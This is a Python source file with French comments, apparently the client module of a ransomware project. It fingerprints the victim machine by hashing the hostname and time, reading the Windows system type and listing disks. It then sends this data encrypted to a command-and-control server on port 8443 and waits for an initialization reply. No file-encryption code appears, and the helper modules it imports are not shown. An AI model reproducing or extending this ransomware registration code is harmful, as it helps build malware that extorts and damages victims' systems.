import socket
from datetime import datetime
import hashlib
import sys
import psutil
import utile.network as net
import utile.message as message
import utile.security as secu

HASH = None
STATE = 'INITIALIZE'


def generate_ID_hash_ransomware():
    """
    Cette fonction récupère l'heure courante et le nom de l'hote pour pouvoir générer et retourner une clé unique qui
    sera l'identifiant du ransomware de la victime :return: str, la clé unique générée
    """
    # Concatène le nom de l'hôte et l'heure courante
    key = socket.gethostname() + str(datetime.now().time())
    # Utitilise une fonction de hash (SHA256) sur la concaténation des deux, ce qui donne une clé unique
    hash_victim = str(hashlib.sha256(key.encode()).hexdigest())

    return hash_victim


def get_type_system():
    """
    Cette fonction récupère le type de système. La méthode getwindowsversion retournera un int de 1 à 3.
    Si il est a 1, c'est un Workstation, si il est à 2, c'est un autre, si il est a 3, c'est un Server.
    :return: str, le type de système
    """

    num_sys = sys.getwindowsversion().product_type
    type_sys = ''

    if num_sys == 1:
        type_sys = 'WORKSTATION'
    elif num_sys == 2:
        type_sys = 'OTHER'
    elif num_sys == 3:
        type_sys = 'SERVER'

    return type_sys


def get_disk():
    """
    Cette fonction utilise la méthode disk_partitions pour récupérer un objet, sur lequel on utilisera la méthode
    device, ce qui nous retournera à chaque fois les disques. Ceux-ci sont transformés en str et ajoutés à une liste.
    :return: list, contient les disques
    """
    disks = []
    for partition in psutil.disk_partitions():
        disks.append(str(partition.device))
    # Enlever // ?
    return disks


def main():
    socket_serv, gp = net.connect_to_serv(port=8443)
    key = secu.Diffie_Hellman_exchange_key(socket_serv, gp)

    if STATE == 'INITIALIZE' or STATE is None:
        disks = get_disk()
        sys_type = get_type_system()
        if not HASH:
            hash_victime = generate_ID_hash_ransomware()
            print(hash_victime)
        else:
            hash_victime = HASH

        packet = message.set_message('INITIALIZE_REQ', [hash_victime, sys_type, disks])
        # à ce niveau, il faudrait enregistrer les infos sur le cfg
        crypt_data = secu.AES_GCM_encrypt(packet, key) # Je sais qu'il ne faut pas utiliser AES-GCM mais TLS, c'est juste dans une question pratique
        net.send_message(socket_serv, crypt_data)
        socket_serv.settimeout(20)
        while True:
            try:
                recv_data = net.receive_message(socket_serv)
                decrypted_data = secu.AES_GCM_decrypt(recv_data, key) # Je sais qu'il ne faut pas utiliser AES-GCM mais TLS, c'est juste dans une question pratique
                break
            except:
                socket_serv.settimeout(20)
                continue
        print(decrypted_data)

        if message.get_message_type(decrypted_data) == 'INITIALIZE_RESP':
            net.CloseCon(socket_serv)


if __name__ == '__main__':
    main()
